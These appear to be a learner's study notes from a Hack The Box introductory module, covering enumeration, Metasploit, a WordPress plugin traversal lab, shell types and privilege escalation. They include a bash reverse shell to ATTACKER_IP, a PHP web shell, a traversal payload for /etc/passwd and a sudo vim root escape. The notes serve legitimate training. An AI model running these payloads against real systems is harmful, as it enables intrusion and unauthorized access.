# Getting Started

## Module Objectives

* An overview of Information Security
* Penetration testing distros
* Common terms and technologies
* Scanning and enumeration basics
* Using public exploits
* Shells, privilege escalation, and transferring files
* Navigating the HTB platform
* A step-by-step walkthrough of a retired HTB box
* Common pitfalls and asking questions effectively
* Completing a box without a walkthrough

---

# Basic Tools

## SSH

### Purpose

* Secure remote access to Linux systems.
* More stable than a reverse shell.
* Can transfer files.
* Can be used for pivoting.

### Common Commands

```bash
ssh user@IP
scp file user@IP:/path
```

---

## Netcat (nc)

### Purpose

* Connect to TCP/UDP ports.
* Banner Grabbing.
* Listen for Reverse Shells.
* Transfer files.

### Banner

A banner is a message sent by a service when a client connects to it. It may reveal:

* Service name
* Software version
* Operating system

### Banner Grabbing

Banner Grabbing is the process of collecting banner information to identify running services and software versions.

### Example

Banner Grabbing

```bash
nc IP 22
```

Example Output

```text
SSH-2.0-OpenSSH_8.4
```

Reverse Shell Listener

```bash
nc -lvnp 4444
```

### Options

| Option | Description   |
| ------ | ------------- |
| `-l`   | Listen        |
| `-v`   | Verbose       |
| `-n`   | No DNS Lookup |
| `-p`   | Port          |

---

## Socat

### Purpose

* Advanced version of Netcat.
* Better reverse shells.
* Port Forwarding.
* Tunneling.
* Upgrade shells to an interactive TTY.

---

## tmux

### Purpose

Manage multiple terminal sessions inside one terminal.

### Useful During Pentesting

* Run Nmap while using Burp Suite.
* Keep reverse shells open.
* SSH into multiple machines.

### Useful Shortcuts

Start tmux

```bash
tmux
```

New Window

```text
Ctrl + B then C
```

Split Vertically

```text
Ctrl + B then %
```

Split Horizontally

```text
Ctrl + B then "
```

---

## Vim

### Purpose

Edit text files directly on Linux systems.

### Basic Commands

Insert Mode

```text
i
```

Exit Insert Mode

```text
Esc
```

Save

```text
:w
```

Quit

```text
:q
```

Save & Quit

```text
:wq
```

Quit Without Saving

```text
:q!
```

### Useful Shortcuts

* `dd` Delete line
* `yy` Copy line
* `dw` Delete word
* `p` Paste

---

# Commands Learned

```bash
ssh user@IP

scp file user@IP:/path

nc IP PORT

nc -lvnp 4444

tmux

vim filename
```

---

# Lab

## Banner Grabbing

```bash
nc 154.57.164.82 30364
```

### Output

```text
SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.1
```

### What I Identified

* Service: SSH
* Software: OpenSSH
* Version: 8.2p1
* Operating System: Ubuntu

---

## What I Learned

* SSH provides stable remote access to Linux systems.
* Netcat can identify services using Banner Grabbing.
* Socat provides more advanced networking capabilities than Netcat.
* tmux helps manage multiple terminal sessions efficiently.
* Vim is an essential text editor for Linux and remote systems.
* Documenting commands and lab results makes future review much easier.



- `yy` Copy line
- `p` Paste
- `dw` Delete word
---
# Service Enumeration

## Goal

Identify running services before attempting exploitation.

Always remember:

> Enumeration comes before Exploitation.

---

## What is a Service?

A service is a program listening on a network port.

Examples

| Port | Service |
|------|----------|
| 21 | FTP |
| 22 | SSH |
| 80 | HTTP |
| 445 | SMB |
| 161 | SNMP |

---

# Nmap

## Purpose

Network Mapper used to discover hosts, ports, services, and versions.

---

## Basic Scan

```bash
nmap IP
```

Scans the 1000 most common TCP ports.

---

## Scan All Ports

```bash
nmap -p- IP
```

Scans every TCP port (1–65535).

---

## Version Detection

```bash
nmap -sV IP
```

Detects software versions.

Example

```text
OpenSSH 8.2p1
Apache 2.4.41
vsFTPd 3.0.3
```

---

## Default Scripts

```bash
nmap -sC IP
```

Runs Nmap Default NSE Scripts.

Examples

- FTP Anonymous Login
- HTTP Title
- SMB Information

---

## Recommended Scan

```bash
nmap -sC -sV -p- IP
```

This is one of the most common commands used during HTB and penetration tests.

---

# Nmap Scripting Engine (NSE)

NSE scripts automate service enumeration.

Scripts are stored in:

```bash
/usr/share/nmap/scripts/
```

---

## Run a Specific Script

```bash
nmap --script script-name IP
```

Examples

Banner

```bash
nmap --script banner IP
```

FTP Anonymous

```bash
nmap --script ftp-anon IP
```

SMB OS Discovery

```bash
nmap --script smb-os-discovery IP
```

---

# FTP Enumeration

## Default Port

```
21/TCP
```

---

## Purpose

Transfer files between systems.

---

## Connect

```bash
ftp IP
```

---

## Anonymous Login

Username

```
anonymous
```

Password

```
Press Enter
```

or

```
anonymous
```

---

## Useful Commands

List Files

```bash
ls
```

Current Directory

```bash
pwd
```

Change Directory

```bash
cd folder
```

Download File

```bash
get filename
```

Upload File

```bash
put filename
```

Exit

```bash
exit
```

---

## Look For

- passwords.txt
- backup.zip
- config.php
- id_rsa
- SSH Keys
- Database Backups
- Credentials

---

## Enumeration Workflow

```
FTP Found
↓

Try Anonymous Login
↓

Browse Files
↓

Download Interesting Files
↓

Extract Credentials
↓

Use Credentials Elsewhere
```

---

# SMB Enumeration

## Default Port

```
445/TCP
```

Sometimes

```
139/TCP
```

---

## Purpose

Windows File Sharing.

---

## Shares

A Share is a shared folder available over the network.

Examples

- Users
- HR
- Finance
- Backups

---

## List Shares

```bash
smbclient -L //IP
```

---

## Anonymous Access

```bash
smbclient //IP/Share -N
```

---

## Login as User

```bash
smbclient //IP/Share -U username
```

---

## Useful Commands

List Files

```bash
ls
```

Current Directory

```bash
pwd
```

Change Directory

```bash
cd folder
```

Download

```bash
get file.txt
```

Upload

```bash
put file.txt
```

Exit

```bash
exit
```

---

## Useful NSE Scripts

```bash
nmap --script smb-os-discovery IP
```

```bash
nmap --script smb-enum-shares IP
```

```bash
nmap --script smb-enum-users IP
```

---

## Look For

- Credentials
- Password Files
- Backup Files
- SSH Keys
- Database Dumps
- Sensitive Documents

---

## Enumeration Workflow

```
SMB Found
↓

List Shares
↓

Anonymous Access?
↓

Browse Files
↓

Download Interesting Files
↓

Extract Credentials
↓

Reuse Credentials
```

---

# SNMP Enumeration

## Default Port

```
161/UDP
```

---

## Purpose

Used by administrators to monitor and manage network devices.

May reveal:

- Hostname
- Users
- Running Processes
- Installed Software
- Network Interfaces
- System Information

---

## Scan UDP Port

```bash
nmap -sU -p 161 IP
```

---

## Community Strings

Similar to a password.

Common values

```
public
```

```
private
```

---

## snmpwalk

```bash
snmpwalk -v2c -c public IP
```

Options

| Option | Meaning |
|---------|----------|
| -v2c | SNMP Version |
| -c | Community String |

---

## Discover Community Strings

```bash
onesixtyone -c community.txt IP
```

---

## Enumeration Workflow

```
SNMP Found
↓

Try public
↓

Collect System Information
↓

Extract Valuable Information
↓

Use Information During Later Stages
```

---

# Common Enumeration Workflow

```
Run Nmap
↓

Identify Open Ports
↓

Detect Versions

↓

Run NSE Scripts

↓

Enumerate Each Service

↓

Collect Credentials

↓

Identify Attack Vectors

↓

Proceed to Exploitation
```

---

# Quick Reference

| Service | Port | First Step |
|----------|------|------------|
| FTP | 21/TCP | Try Anonymous Login |
| SSH | 22/TCP | Banner Grabbing / Credentials |
| HTTP | 80/443 | Browse Website & Enumerate |
| SMB | 445/TCP | Enumerate Shares |
| SNMP | 161/UDP | Try public using snmpwalk |
---

# Practice

## Exercise 1

### Question

Perform an Nmap scan of the target.

What does Nmap display as the version of the service running on port **8080**?

### Command

```bash
nmap -A -p8080 10.129.47.22
```

### Explanation

| Option | Meaning |
|---------|----------|
| `-A` | Aggressive Scan (OS Detection, Version Detection, Default NSE Scripts, Traceroute) |
| `-p8080` | Scan only port 8080 |

### Output

```text
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat
```

### Answer

```text
Apache Tomcat
```

### What I Learned

- `-A` performs an aggressive scan.
- Nmap detected the service version as **Apache Tomcat**.
- Port **8080** is commonly used for web applications such as **Apache Tomcat**.
---

## Exercise 2

### Question

Perform an Nmap scan of the target and identify the non-default port that the **Telnet** service is running on.

### Command

```bash
nmap -sC -sV 10.129.47.22
```

### Explanation

| Option | Meaning |
|---------|----------|
| `-sC` | Run the default NSE scripts |
| `-sV` | Detect service versions |

### Output

```text
PORT     STATE SERVICE      VERSION

445/tcp  open  netbios-ssn  Samba smbd 4.x
2323/tcp open  telnet       Linux telnetd
```

### Answer

```text
2323
```

### What I Learned

- `-sV` detects the service version.
- Telnet normally runs on **port 23**.
- During enumeration, never assume services use their default ports.
- Nmap identified that **Linux telnetd** was running on the non-default port **2323**.
---

## Exercise 3

### Question

List the SMB shares available on the target host.

Connect to the available share as the **bob** user.

Once connected, access the folder called **flag** and submit the contents of the **flag.txt** file.

---

### Step 1 - List SMB Shares

```bash
smbclient -L //10.129.47.22 -N
```

### Explanation

| Option | Meaning |
|---------|----------|
| `-L` | List available SMB shares |
| `//IP` | Target host |
| `-N` | No password (Anonymous login) |

### Output

```text
Sharename
---------
print$
users
IPC$
```

---

### Step 2 - Connect to the Share

```bash
smbclient //10.129.47.22/users -U bob
```

### Explanation

| Option | Meaning |
|---------|----------|
| `//IP/users` | Connect to the users share |
| `-U bob` | Authenticate as the user bob |

---

### Step 3 - Browse the Share

List files

```bash
ls
```

Enter the flag directory

```bash
cd flag
```

List files again

```bash
ls
```

---

### Step 4 - Download the Flag

```bash
get flag.txt
```

Exit SMB

```bash
exit
```

---

### Step 5 - Read the Flag

```bash
cat flag.txt
```

---

### Answer

```text
dceece590f3284c3866305eb2473d099
```

---
# Web Enumeration

## Goal

Collect as much information as possible about a web application before attempting exploitation.

> Enumeration comes before Exploitation.

---

# Web Enumeration Workflow

```
Open Website
↓

View Source Code

↓

Check robots.txt

↓

Inspect HTTP Headers

↓

Fingerprint Technologies

↓

Directory Enumeration

↓

Subdomain Enumeration

↓

Search for Vulnerabilities
```

---

# Gobuster

## Purpose

Directory and File Brute Forcing.

Used to discover hidden:

- Directories
- Files
- Admin Panels
- Backups
- Upload Folders

---

## Directory Enumeration

```bash
gobuster dir -u http://IP -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

### Options

| Option | Meaning |
|---------|----------|
| `dir` | Directory enumeration mode |
| `-u` | Target URL |
| `-w` | Wordlist |

---

## Example Output

```text
/index.php     200
/admin         403
/wordpress     301
```

---

# HTTP Status Codes

| Code | Meaning |
|------|----------|
| 200 | OK (Resource exists) |
| 301 | Permanent Redirect |
| 302 | Temporary Redirect |
| 403 | Forbidden (Exists but no access) |
| 404 | Not Found |
| 500 | Internal Server Error |

---

# DNS Subdomain Enumeration

## Purpose

Discover hidden subdomains.

Examples

- admin.example.com
- vpn.example.com
- api.example.com
- blog.example.com

---

## Command

```bash
gobuster dns -d example.com -w /usr/share/seclists/Discovery/DNS/namelist.txt
```

### Options

| Option | Meaning |
|---------|----------|
| `dns` | DNS enumeration mode |
| `-d` | Domain |
| `-w` | Wordlist |

---

# cURL

## Purpose

Retrieve HTTP response headers.

Useful for Banner Grabbing.

---

## Command

```bash
curl -IL http://IP
```

### Options

| Option | Meaning |
|---------|----------|
| `-I` | Show HTTP headers only |
| `-L` | Follow redirects |

---

## Information You May Find

- Web Server
- Server Version
- PHP Version
- Framework
- Authentication Methods

---

# WhatWeb

## Purpose

Fingerprint web technologies automatically.

Detects:

- Web Server
- CMS
- Programming Language
- Framework
- JavaScript Libraries

---

## Command

```bash
whatweb IP
```

---

## Example Output

```text
Apache 2.4.41
PHP 7.4
WordPress
Bootstrap
```

---

# SSL/TLS Certificates

HTTPS websites may reveal useful information inside their certificates.

Possible Information

- Company Name
- Email Address
- Organization
- Subdomains

---

# robots.txt

## Purpose

Instruct search engines which pages should not be indexed.

---

## Check

```text
http://IP/robots.txt
```

---

## Example

```text
Disallow: /admin
Disallow: /private
Disallow: /uploads
```

Hidden directories found here should always be investigated.

---

# Source Code

Always inspect the HTML source.

Shortcut

```
Ctrl + U
```

---

## Look For

- Comments
- Hidden Links
- Test Credentials
- API Keys
- JavaScript Files
- Sensitive Information

Example

```html
<!--
username=test
password=test123
-->
```

---

# Common Web Enumeration Checklist

- Open the website
- Check the page source
- Read robots.txt
- Inspect HTTP headers
- Run WhatWeb
- Run Gobuster
- Enumerate subdomains
- Identify technologies
- Search for vulnerabilities

---

# Common Commands

```bash
gobuster dir -u http://IP -w WORDLIST
```

```bash
gobuster dns -d DOMAIN -w WORDLIST
```

```bash
curl -IL http://IP
```

```bash
whatweb IP
```

---

# What I Learned

- Web Enumeration is one of the most important phases of a penetration test.
- Hidden directories often expose sensitive functionality.
- HTTP headers reveal valuable information about the target.
- WhatWeb quickly fingerprints web technologies.
- robots.txt and Source Code frequently expose useful information.
- Always enumerate thoroughly before attempting exploitation.

### What I Learned

- Use `smbclient -L` to enumerate SMB shares.
- Anonymous access (`-N`) may reveal available shares.
- Use `-U` to authenticate as a specific user.
- SMB provides commands similar to Linux such as `ls` and `cd`.
- `get` downloads files from the remote SMB share to the local machine.
- After downloading a file, use Linux commands such as `cat` to read its contents.
---
# Public Exploits & Metasploit

## Goal

After identifying a service and its version during Enumeration, search for publicly available exploits before attempting manual exploitation.

---

# Exploitation Workflow

```
Nmap Scan
↓

Identify Service + Version

↓

Search for Public Exploits

↓

Validate the Exploit

↓

Configure the Exploit

↓

Check Vulnerability

↓

Run Exploit

↓

Gain Shell

↓

Post-Exploitation
```

---

# Public Exploits

## Purpose

Public exploits are exploit codes released by security researchers for known vulnerabilities.

They may target:

- Operating Systems
- Web Applications
- Network Services
- CMS
- Plugins
- Databases

---

# Finding Public Exploits

## Google

Search using:

```
<Application Name> exploit
```

Examples

```
OpenSSH 7.2 exploit
```

```
Apache 2.4.41 exploit
```

```
WordPress plugin exploit
```

---

## Searchsploit

### Purpose

Search local copies of Exploit-DB.

---

### Install

```bash
sudo apt install exploitdb -y
```

---

### Search

```bash
searchsploit openssh 7.2
```

Example Output

```text
OpenSSH 7.2 Username Enumeration

OpenSSH 7.2 Command Injection

OpenSSH 7.2 DoS
```

---

## Other Resources

- Exploit-DB
- Rapid7
- GitHub
- Google

---

# Metasploit Framework (MSF)

## Purpose

Metasploit is a penetration testing framework that contains:

- Public Exploits
- Payloads
- Auxiliary Modules
- Post-Exploitation Modules
- Meterpreter

---

## Start Metasploit

```bash
msfconsole
```

---

# Search for Exploits

```bash
search eternalblue
```

or

```bash
search ms17
```

---

# Select an Exploit

```bash
use exploit/windows/smb/ms17_010_psexec
```

---

# Show Required Options

```bash
show options
```

---

# Important Options

## RHOSTS

Target IP Address.

Example

```bash
set RHOSTS 10.10.10.40
```

---

## LHOST

Your attack machine IP.

Usually

```bash
set LHOST tun0
```

---

# Verify the Vulnerability

If supported, verify the target before exploitation.

```bash
check
```

Possible Output

```text
Host is likely VULNERABLE
```

---

# Run the Exploit

```bash
run
```

or

```bash
exploit
```

---

# Meterpreter

## Purpose

Advanced shell provided by Metasploit.

Allows:

- Execute commands
- Upload files
- Download files
- Pivoting
- Post-Exploitation
- Privilege Escalation

---

## Drop to a Normal Shell

```bash
shell
```

---

## Check Current User

```bash
whoami
```

Example

```text
NT AUTHORITY\SYSTEM
```

---

# Common Metasploit Commands

| Command | Purpose |
|----------|----------|
| `msfconsole` | Start Metasploit |
| `search <name>` | Search for modules |
| `use <module>` | Select a module |
| `show options` | Display required options |
| `set RHOSTS IP` | Set target IP |
| `set LHOST tun0` | Set attacker IP |
| `check` | Verify if the target is vulnerable |
| `run` | Execute the exploit |
| `exploit` | Execute the exploit |
| `shell` | Spawn a normal shell |
| `whoami` | Show current user |

---

# Best Practices

- Always verify the service version before selecting an exploit.
- Read the exploit description before using it.
- Use `check` when available.
- Do not rely only on Metasploit.
- Be prepared to modify or use PoC exploits manually if needed.

---

# What I Learned

- Enumeration comes before Exploitation.
- Searchsploit helps locate public exploits locally.
- Metasploit simplifies exploitation but should not be your only tool.
- Configure required options before running an exploit.
- Meterpreter provides powerful post-exploitation capabilities.
- A successful exploit often leads to an interactive shell for further testing.
---
# Lab - Public Exploits (WordPress Simple Backup)

## Objective

Identify the services running on the target, search for public exploits, and retrieve the contents of `/flag.txt`.

---

# Step 1 - Service Enumeration

## HTTP Header Enumeration

```bash
curl -I http://154.57.164.70:32587
```

Output

```http
HTTP/1.1 200 OK
Server: Apache/2.4.41 (Ubuntu)
Link: <http://154.57.164.70:32587/index.php/wp-json/>; rel="https://api.w.org/"
```

### Findings

- Apache 2.4.41
- WordPress detected via `wp-json`

> **Note:** `wp-json` is the REST API endpoint used by WordPress and is a strong indicator that the target is running WordPress.

---

# Step 2 - Initial Mistake

I first searched for Apache exploits.

```bash
searchsploit "Apache 2.4.41"
```

Many unrelated exploits were returned.

### Lesson Learned

The web server (Apache) is not always the vulnerable component.

A web application may be running on top of Apache.

```
Apache
↓

WordPress

↓

Plugin

↓

Plugin Version
```

Always identify the application before searching for exploits.

---

# Step 3 - Identify the Application

Browsing the website revealed:

```
Simple Backup Plugin 2.7.10
```

The target was running:

- WordPress
- Simple Backup Plugin
- Version 2.7.10

---

# Step 4 - Search for Public Exploits

Incorrect search

```bash
searchsploit Wordpress 2.7.10
```

Returned generic WordPress exploits.

---

Correct search

```bash
searchsploit "Simple Backup"
```

Output

```text
WordPress Plugin Simple Backup 2.7.11 - Multiple Vulnerabilities
```

---

# Step 5 - Read the PoC

Open the exploit.

```bash
searchsploit -x 39883
```

The PoC described two vulnerabilities.

## 1. Arbitrary File Deletion

Not useful for this lab.

---

## 2. Arbitrary File Download

This vulnerability allows downloading files from the server without authentication.

Example from the PoC

```
download_backup_file=oldBackups/../../../../../../etc/passwd
```

### Vulnerability Type

- Directory Traversal
- Arbitrary File Download

---

# Step 6 - Metasploit

Search for the module.

```bash
msfconsole
```

```bash
search "simple backup"
```

Output

```text
auxiliary/scanner/http/wp_simple_backup_file_read
```

Load the module.

```bash
use 0
```

Show required options.

```bash
show options
```

Configure the module.

```bash
set RHOSTS 154.57.164.70
```

```bash
set RPORT 32587
```

```bash
set TARGETURI /
```

```bash
set FILEPATH /flag.txt
```

Run the module.

```bash
run
```

The module successfully retrieved the contents of `/flag.txt`.

---

# Key Concepts Learned

## Enumeration comes first

Always identify:

- Service
- Application
- Plugin
- Version

before searching for exploits.

---

## Apache is not always the target

Apache only serves the application.

The vulnerability may exist in:

- WordPress
- Joomla
- Drupal
- Plugins
- Themes

rather than Apache itself.

---

## WordPress Fingerprints

Indicators that the target is running WordPress:

- `/wp-json/`
- `/wp-admin/`
- `/wp-login.php`
- `/wp-content/`
- `/wp-content/plugins/`
- `xmlrpc.php`

---

## Reading a PoC

When reading a PoC, identify:

1. Vulnerability type
2. Authentication required?
3. Vulnerable parameter
4. Payload
5. Expected result

---

## Search Strategy

❌ Wrong

```
Apache exploit
```

❌ Wrong

```
WordPress exploit
```

✅ Correct

```
Plugin exploit
```

Search from the most specific component.

```
Service
↓

Application

↓

Plugin

↓

Version
```

---

# Commands Used

```bash
curl -I http://IP
```

```bash
searchsploit "Simple Backup"
```

```bash
searchsploit -x 39883
```

```bash
msfconsole
```

```bash
search "simple backup"
```

```bash
use 0
```

```bash
show options
```

```bash
set RHOSTS IP
```

```bash
set RPORT PORT
```

```bash
set TARGETURI /
```

```bash
set FILEPATH /flag.txt
```

```bash
run
```

---

# What I Learned

- Enumeration is more important than immediately using Metasploit.
- Identify the application before searching for exploits.
- `wp-json` is a reliable WordPress fingerprint.
- Read the PoC before using an exploit.
- Focus on the most specific component (plugin) rather than the web server.
- Metasploit modules are useful, but understanding the vulnerability is more important than simply running a module.
---
# Types of Shells

## Objective

Learn the three main shell types used after exploiting a target:

- Reverse Shell
- Bind Shell
- Web Shell

Understand when and how each shell is used.

---

# What is a Shell?

A shell provides interactive command-line access to a compromised system.

Instead of executing one command at a time through an exploit, a shell allows continuous interaction with the target.

Example:

```bash
id
pwd
ls
cat /etc/passwd
```

---

# Reverse Shell

## Description

The target initiates a connection back to the attacker's machine.

```
Victim  ─────────────►  Attacker
```

This is the most common shell used during penetration testing.

---

## Step 1 - Start a Listener

```bash
nc -lvnp 1234
```

### Netcat Options

| Option | Description |
|---------|-------------|
| `-l` | Listen for incoming connections |
| `-v` | Verbose output |
| `-n` | Disable DNS resolution |
| `-p` | Listening port |

---

## Step 2 - Find Your VPN IP

```bash
ip a
```

Use the IP address on the **tun0** interface when working on HTB.

Example:

```
10.10.14.44
```

---

## Step 3 - Execute Reverse Shell Payload

Linux (Bash)

```bash
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/1234 0>&1'
```

Windows (PowerShell)

```powershell
powershell reverse shell
```

(Usually generated from PayloadsAllTheThings.)

---

## Result

The victim connects back to our Netcat listener.

```
Victim ─────► nc -lvnp 1234
```

We receive an interactive shell.

---

## Advantages

- Very common.
- Fast to obtain.
- Works well after RCE.

## Disadvantages

- Connection is fragile.
- If disconnected, the exploit must usually be executed again.

---

# Bind Shell

## Description

The target opens a listening port.

The attacker connects to it.

```
Attacker ─────────► Victim
```

---

## Bind Shell Command

Example:

```bash
nc -lvp 1234
```

(on the target)

---

## Connect

```bash
nc TARGET_IP 1234
```

---

## Advantages

- Easy to reconnect if disconnected.

## Disadvantages

- Firewalls often block inbound connections.
- Less common than Reverse Shell.

---

# Reverse vs Bind

| Reverse Shell | Bind Shell |
|----------------|------------|
| Victim connects to attacker | Attacker connects to victim |
| More common | Less common |
| Better against firewalls | Often blocked |

---

# Web Shell

## Description

A Web Shell is a script uploaded to the web server that executes operating system commands through HTTP requests.

---

## PHP Web Shell

```php
<?php system($_REQUEST["cmd"]); ?>
```

---

## Upload

Example:

```
shell.php
```

---

## Execute Commands

Browser

```
http://TARGET/shell.php?cmd=id
```

or

```bash
curl http://TARGET/shell.php?cmd=id
```

Output:

```
uid=33(www-data)
```

---

## Advantages

- Works through HTTP/HTTPS.
- Survives server reboot if the file remains.
- Does not require opening a new TCP port.

## Disadvantages

- Less interactive.
- One HTTP request per command.

---

# Default Webroots

| Web Server | Default Webroot |
|------------|-----------------|
| Apache | `/var/www/html/` |
| Nginx | `/usr/local/nginx/html/` |
| IIS | `C:\inetpub\wwwroot\` |
| XAMPP | `C:\xampp\htdocs\` |

---

# Upgrading a Reverse Shell

A basic Netcat shell has limitations:

- No command history.
- No TAB completion.
- Arrow keys do not work.

Upgrade it to a full TTY.

---

## Spawn a TTY

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

---

## Background Shell

```
CTRL + Z
```

---

## Configure Terminal

```bash
stty raw -echo
```

---

## Return to Shell

```bash
fg
```

Press Enter.

---

## Reset Terminal

```bash
reset
```

---

## Fix Terminal Type

```bash
export TERM=xterm-256color
```

---

## Get Terminal Size

Local machine:

```bash
stty size
```

Example:

```
67 318
```

---

Remote shell:

```bash
stty rows 67 columns 318
```

---

# When to Use Each Shell

| Shell | Typical Scenario |
|--------|------------------|
| Reverse Shell | After Remote Code Execution (RCE) |
| Bind Shell | When the attacker can reach the target directly |
| Web Shell | After File Upload or Web RCE |

---

# Important Notes

- Reverse Shell is the most common shell in penetration testing.
- HTB machines usually require using the **tun0** VPN IP.
- A Web Shell communicates through HTTP instead of opening a new TCP connection.
- Not every vulnerability leads to a shell.

---

# Vulnerability vs Shell

| Vulnerability | Shell? |
|--------------|--------|
| XSS | ❌ |
| IDOR | ❌ |
| SQL Injection | Sometimes |
| Directory Traversal | ❌ |
| File Read | ❌ |
| RCE | ✅ |
| Command Injection | ✅ |

---

# Typical Workflow

```
Find RCE
        │
        ▼
Start Netcat Listener
        │
        ▼
Execute Reverse Shell Payload
        │
        ▼
Gain Shell
        │
        ▼
Upgrade to TTY
        │
        ▼
Privilege Escalation
```

---

# Key Takeaways

- A shell provides interactive access to the target system.
- Reverse Shell is the most frequently used shell.
- Bind Shell works in the opposite direction of Reverse Shell.
- Web Shell executes commands through HTTP requests.
- Upgrade Netcat shells to a full TTY for better usability.
- Shell access is usually the first step before Privilege Escalation.
---
# Privilege Escalation (PrivEsc)

## Objective

Privilege Escalation is the process of increasing permissions after gaining initial access to a system.

The goal is to become:

- **Linux:** `root`
- **Windows:** `Administrator` or `SYSTEM`

---

# Typical Workflow

```
Recon
    ↓
Enumeration
    ↓
Exploitation
    ↓
Initial Shell
    ↓
Privilege Escalation
    ↓
Root / SYSTEM
```

---

# Why is Privilege Escalation Needed?

After exploiting a vulnerability, we usually obtain access as a low-privileged user.

Example:

```bash
whoami
```

Output:

```
www-data
```

`www-data` is the Apache web server user and has very limited permissions.

Examples:

```bash
cat /etc/shadow
```

```
Permission denied
```

```bash
cd /root
```

```
Permission denied
```

The objective is to find a way to elevate privileges and become **root**.

---

# Enumeration Before Exploitation

The first step after obtaining a shell is **Enumeration**.

Do **not** immediately search for exploits.

Instead, collect information about the target.

Typical enumeration order:

```bash
whoami
```

```bash
id
```

```bash
uname -a
```

```bash
cat /etc/os-release
```

```bash
sudo -l
```

---

# Enumeration Scripts

Instead of running dozens of commands manually, automated enumeration tools can be used.

Common tools:

- LinPEAS (Linux)
- WinPEAS (Windows)
- Seatbelt (Windows)
- JAWS (Windows)

Example:

```bash
./linpeas.sh
```

These tools **do not exploit vulnerabilities**.

They only search for potential privilege escalation opportunities.

---

# What Do Enumeration Tools Look For?

## 1. Kernel Version

Identify the operating system kernel.

```bash
uname -a
```

or

```bash
cat /etc/os-release
```

If the kernel is outdated, search for public privilege escalation exploits.

Example:

```
DirtyCow
```

**Note**

Kernel exploits can crash production systems and should be used carefully.

---

## 2. Installed Software

Check installed applications.

Example:

```bash
dpkg -l
```

Old software versions may contain privilege escalation vulnerabilities.

---

## 3. Sudo Privileges

One of the most important checks.

```bash
sudo -l
```

This command shows which programs the current user can execute with sudo.

Example:

```
(root) NOPASSWD: /usr/bin/vim
```

If a program appears here, check **GTFOBins** for privilege escalation techniques.

---

# GTFOBins

GTFOBins documents legitimate Linux binaries that can be abused to gain elevated privileges.

Workflow:

```
sudo -l
      ↓
Allowed Program
      ↓
Search GTFOBins
      ↓
Escape to Root Shell
```

Example:

```
sudo vim -c ':!/bin/bash'
```

---

## 4. Scheduled Tasks (Cron Jobs)

Cron automatically executes scripts.

If a root-owned scheduled script is writable, it may be modified to execute malicious commands.

Example:

```
backup.sh
```

If editable:

```
Reverse Shell
```

or

```
Privilege Escalation Payload
```

may execute as root.

---

## 5. Credentials

Search configuration files for passwords.

Examples:

```bash
cat config.php
```

Possible findings:

- Database passwords
- User passwords
- API keys
- Tokens

Administrators often reuse passwords.

---

## 6. SSH Keys

Search for SSH private keys.

Examples:

```
~/.ssh/
```

or

```
/root/.ssh/
```

If a private key is found:

```bash
chmod 600 id_rsa
```

```bash
ssh root@TARGET -i id_rsa
```

If write access is available, a new public key can be added to:

```
authorized_keys
```

to gain SSH access.

---

# Common Privilege Escalation Targets

- Kernel vulnerabilities
- Sudo misconfigurations
- SUID binaries
- Cron jobs
- Weak permissions
- Configuration files
- Password reuse
- SSH keys
- Installed software vulnerabilities

---

# Recommended Enumeration Order

```bash
whoami
```

↓

```bash
id
```

↓

```bash
uname -a
```

↓

```bash
cat /etc/os-release
```

↓

```bash
sudo -l
```

↓

Check:

- SUID
- Cron Jobs
- Passwords
- SSH Keys
- Installed Software
- Kernel Version

---

# Important Notes

- Privilege Escalation is a **phase**, not a single exploit.
- Enumeration is more important than immediately searching for exploits.
- Automated tools help identify attack vectors but do not exploit them.
- Always verify findings manually.
- `sudo -l` is one of the first commands to run after obtaining a shell.

---

# Key Takeaways

- Initial access usually provides a low-privileged shell.
- The goal is to become **root** (Linux) or **Administrator/SYSTEM** (Windows).
- Enumeration is the foundation of privilege escalation.
- Always check:
  - Kernel version
  - Installed software
  - `sudo -l`
  - Cron jobs
  - Credentials
  - SSH keys
- Use GTFOBins whenever `sudo -l` allows execution of Linux binaries.
